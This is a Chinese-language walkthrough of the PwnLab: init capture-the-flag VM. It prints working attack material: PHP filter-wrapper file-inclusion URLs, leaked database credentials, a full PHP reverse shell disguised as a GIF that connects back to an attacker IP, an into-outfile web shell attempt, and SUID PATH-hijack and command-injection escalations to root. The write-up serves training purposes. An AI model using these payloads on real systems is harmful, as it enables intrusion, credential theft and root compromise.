# 信息搜集

1、端口信息收集

```bash
└─# IP=192.168.0.102
└─# nmap -A -sVC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
```

```bash
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open   rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35047/tcp6  status
|   100024  1          46372/tcp   status
|   100024  1          48257/udp   status
|_  100024  1          52289/udp6  status
3306/tcp  open   mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, FoundRows, LongPassword, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, InteractiveClient, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsCompression, ConnectWithDatabase, Support41Auth, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: &&-P,(#tE:2,&wG;2+}X
|_  Auth Plugin Name: mysql_native_password
46372/tcp open   status  1 (RPC #100024)
48257/tcp closed unknown
MAC Address: 00:0C:29:8F:9F:0B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
```

2、80 端口探测

php网站  

```bash
http://192.168.0.102/index.php
```

<img src=".\图片\Snipaste_2023-06-26_13-00-53.png" alt="Snipaste_2023-06-26_13-00-53" style="zoom:80%;" />

nikto 简单探测

```bash
└─# nikto -host 192.168.0.102

---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.0.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2023-06-26 01:01:46 (GMT-4) (29 seconds)
---------------------------------------------------------------------------
```

gobuster 目录扫描

```bash
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak
```

```bash
/index.php            (Status: 200) [Size: 332]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.102/images/]
/.html                (Status: 403) [Size: 293]
/login.php            (Status: 200) [Size: 250]
/.php                 (Status: 403) [Size: 292]
/.html.bak            (Status: 403) [Size: 297]
/upload               (Status: 301) [Size: 315] [--> http://192.168.0.102/upload/]
/upload.php           (Status: 200) [Size: 19]
/config.php           (Status: 200) [Size: 0]
```

# web打点

## 文件包含读取特殊文件

1、观察相似 url，都是  `?page=`

```bash
http://192.168.0.102/index.php?page=login
http://192.168.0.102/index.php?page=upload
```

有没有可能存在文件包含，运用伪协议，且包含下已知存在的文件试试

2、尝试文件包含

使用如下失败：

```http
http://192.168.0.102/index.php?page=php://filter/read=convert.base64-encode/resource=config.php
```

使用如下则成功：

```http
http://192.168.0.102/index.php?page=php://filter/read=convert.base64-encode/resource=config
```

合理怀疑是固定了包含的后缀为 php

3、得到敏感文件源码

```bash
┌──(root💀kali)-[~/pwnlab]
└─# echo PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+ | base64 -d 
> config.php 
                                                                                                                                                                  
┌──(root💀kali)-[~/pwnlab]
└─# cat config.php 
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?> 
```

config.php：

```php
<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>
```

index.php：

```bash
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```

upload.php：

```php
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>
```

## 连接数据库

由于之前得到了 config.php 里的数据库连接的账号密码

```
root:H4u%QJ_H99
```

连接数据库

```bash
└─# mysql -uroot -pH4u%QJ_H99 -h 192.168.0.102
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 65
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.001 sec)
```

### 尝试写shell

这里很奇怪，我执行命令，读取的是我kali里的passwd

```
MySQL [Users]> system cat /etc/passwd;
```

读写文件失败啊

```bash
MySQL [Users]> SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php"
    -> ;
ERROR 1045 (28000): Access denied for user 'root'@'%' (using password: YES)
```

### 读取网站用户信息

这里对密码 base64 解密即可

```bash
MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
```

得到一些账号密码

```
kent:JWzXuBJJNy
mike:SIfdsTEn6I
kane:iSv5Ym2GRo
```

登录后有文件上传的功能

<img src=".\图片\Snipaste_2023-06-26_13-52-12.png" alt="Snipaste_2023-06-26_13-52-12" style="zoom:80%;" />

## 代码审计

阅读之前获得的源码，发现 upload.php 里是白名单，而 index.php 里文件包含指定了后缀 php，但由于 index.php 里还存在 包含 cookie

```php
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
```

所以我们可以上传一个图片马，由 cookie 来包含解析图片马

<img src=".\图片\Snipaste_2023-06-26_14-04-53.png" alt="Snipaste_2023-06-26_14-04-53" style="zoom:80%;" />

图片马 backdoor.gif 如下：

```gif
GIF89a
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.0.103';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?
```

得到shell

```bash
└─# nc -lvvp 1234            
listening on [any] 1234 ...
connect to [192.168.0.103] from 192.168.0.102 [192.168.0.102] 58500
Linux pwnlab 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux
 02:04:29 up  1:10,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (494): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pwnlab:/$ 
```

# 权限提升

## 提权到本地用户mike

用之前数据库里的密码尝试 su

```bash
www-data@pwnlab:/$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
  
www-data@pwnlab:/$ su kent
su kent
Password: JWzXuBJJNy

kent@pwnlab:/$ cd
cd
kent@pwnlab:~$ ls
ls
kent@pwnlab:~$ su kane
su kane
Password: iSv5Ym2GRo

kane@pwnlab:/home/kent$ cd
cd
kane@pwnlab:~$ ls
ls
msgmike
```

发现特殊文件 msgmike

```
-rwsr-sr-x 1 mike mike 5148 Mar 17  2016 msgmike
```

发现其使用了 cat 命令

```bash
kane@pwnlab:~$ strings msgmike
cat /home/mike/msg.txt
```

### 尝试环境变量劫持

```bash
kane@pwnlab:~$ echo /bin/bash > cat
echo /bin/bash > cat

kane@pwnlab:~$ chmod +x cat

kane@pwnlab:~$ export PATH=.:$PATH
export PATH=.:$PATH

kane@pwnlab:~$ echo $PATH
echo $PATH
.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

kane@pwnlab:~$ ./msgmike
./msgmike

mike@pwnlab:~$ id
id
uid=1002(mike) gid=1002(mike) groups=1002(mike),1003(kane)
```

## 提权到root

查找 suid 权限的文件，找到敏感文件 msg2root

```bash
mike@pwnlab:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/mount
/bin/su
/bin/umount
/sbin/mount.nfs
/home/mike/msg2root
/home/kane/msgmike
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/at
/usr/bin/passwd
/usr/bin/procmail
/usr/bin/chsh
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/exim4
```

```bash
mike@pwnlab:~$ strings /home/mike/msg2root
/bin/echo %s >> /root/messages.txt
```

```bash
mike@pwnlab:/home/mike$ ls -al
ls -al
total 28
drwxr-x--- 2 mike mike 4096 Mar 17  2016 .
drwxr-xr-x 6 root root 4096 Mar 17  2016 ..
-rw-r--r-- 1 mike mike  220 Mar 17  2016 .bash_logout
-rw-r--r-- 1 mike mike 3515 Mar 17  2016 .bashrc
-rwsr-sr-x 1 root root 5364 Mar 17  2016 msg2root
-rw-r--r-- 1 mike mike  675 Mar 17  2016 .profile
```

### 命令劫持提权

msg2root 可以以 root 身份执行 echo 命令，且参数为可控

于是，分开执行 `ss;bash -p;` （bash -p为高权限执行bash）

```bash
bash-4.3$ ./msg2root
./msg2root
Message for root: ss;bash -p;
ss;bash -p;
ss
bash-4.3# id
id
uid=1002(mike) gid=1002(mike) euid=0(root) egid=0(root) groups=0(root),1003(kane)
bash-4.3# cd /root
cd /root
bash-4.3# ls
ls
flag.txt  messages.txt
bash-4.3# cat fl*
cat fl*
.-=~=-.                                                                 .-=~=-.
(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
(_ ___)  _____                             _                            (_ ___)
(__  _) /  __ \                           | |                           (__  _)
( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
( _ __)                     __/ |                                       ( _ __)
(__  _)                    |___/                                        (__  _)
(__  _)                                                                 (__  _)
(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
(__  _) this challenge.                                                 (__  _)
(_ ___)                                                                 (_ ___)
( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
(__  _) reading it                                                      (__  _)
(__  _)                                                                 (__  _)
(__  _)                                             For sniferl4bs.com  (__  _)
( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
(__  _)                                                                 (__  _)
(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
`-._.-'                                                                 `-._.-'
```

# 补充技巧-提升shell手感

完全提升 shell 的操作手感

```bash
└─# nc -lvvp 1234  
www-data@pwnlab:/$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@pwnlab:/$ export TERM=xterm
export TERM=xterm
```

再点击键盘 `Crtl Z` 挂到后台

再挂到前台

```bash
└─# stty raw -echo; fg
```

再点击键盘 `Enter` 

于是操作手感就上来了

# 总结

关于文件包含指定了后缀，要么可能截断，要么只能顺从它，读取指定后缀的文件，重要的文件比如网站配置文件如config啥的

文件包含指定了目录，于是可以  `../` 跨越目录

注意 url 中可能存在文件包含的地方，比如这个靶场的  `http://192.168.0.102/index.php?page=login`


